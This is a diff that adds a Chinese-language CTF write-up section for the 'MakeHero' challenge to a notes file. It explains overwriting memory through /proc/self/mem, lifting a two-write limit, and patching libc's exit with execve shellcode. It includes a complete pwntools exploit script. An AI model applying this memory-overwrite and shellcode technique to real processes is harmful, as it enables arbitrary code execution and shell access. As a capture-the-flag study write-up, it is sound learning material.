@@ -891,7 +891,115 @@ p.interactive()
 ![[Pasted image 20241022152010.png]]
 走迷宫的算法我直接让copilot代为生成，实际采用广搜或深搜都可以，找到一条路然后将路径转为wasd保留即可。
 ### MakeHero(复现)
+根据wp中所说，下面这段`func`提供了一个功能，即可通过`open(/proc/self/mem)`实现任意地址的读写
+![[Pasted image 20241124101944.png]]
+![[Pasted image 20241124102222.png]]
+但原程序限制了只能任意读写两次，显然次数是不够的，我们可以将-1修改为+1来使循环永远不停止
+之后我们便有了无限的修改次数，这里可以将`exit`直接修改为`shellcode`，然后手动使程序推出执行`exit`,也就是我们修改后的`shellcode`,来获取`shell`
+exp:
+```python
+from pwn import *
 
+from wstube import websocket
+
+  
+
+context(log_level='debug', arch='amd64', os='linux')
+
+context.terminal = ["tmux", "splitw", "-h"]
+
+uu64 = lambda x: u64(x.ljust(8, b'\x00'))
+
+s = lambda x: p.send(x)
+
+sa = lambda x, y: p.sendafter(x, y)
+
+sl = lambda x: p.sendline(x)
+
+sla = lambda x, y: p.sendlineafter(x, y)
+
+r = lambda x: p.recv(x)
+
+ru = lambda x: p.recvuntil(x)
+
+  
+
+# p = process('./MakeHero')
+
+p = websocket("wss://ctf.xidian.edu.cn/api/traffic/8ydliACcWZMe46gdyWeIh?port=9999")
+
+libc = ELF("./libc.so.6")
+
+  
+
+def u8_ex(data) -> int:
+
+assert isinstance(data, (str, bytes)), "wrong data type!"
+
+length = len(data)
+
+assert length <= 1, "len(data) > 1!"
+
+if isinstance(data, str):
+
+data = data.encode('latin-1')
+
+data = data.ljust(1, b"\x00")
+
+return unpack(data, 8)
+
+  
+
+def write_mem(addr, byte):
+
+if isinstance(byte, bytes):
+
+sla(b'\x89\xef\xbc\x81', hex(addr) + ' ' + hex(u8_ex(byte)))
+
+elif isinstance(byte, int):
+
+sla(b'\x89\xef\xbc\x81', hex(addr) + ' ' + hex(byte))
+
+  
+
+def write_code(addr, code):
+
+for i in range(len(code)):
+
+write_mem(addr + i, code[i])
+
+  
+
+ru(b'** ')
+
+code_base = int(p.recvuntil(b' -', drop=True), 16)
+
+  
+
+ru(b'## ')
+
+libc_base = int(p.recvuntil(b' -', drop=True), 16)
+
+  
+
+sl(b'inkey')
+
+  
+
+write_mem(code_base + 0x1877, 0x1)
+
+write_mem(libc_base + libc.sym.exit + 4, b'\x90')
+
+write_code(libc_base + libc.sym.exit + 5, b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")
+
+sl(b'bye')
+
+  
+
+p.interactive()
+```
+![[Pasted image 20241124101731.png]]
+这里exit+4与exit+5分别是对应将push rax替换为nop，以及从exit+5开始替换
 ![[Pasted image 20241124091614.png]]
 
 ### reread(复现)
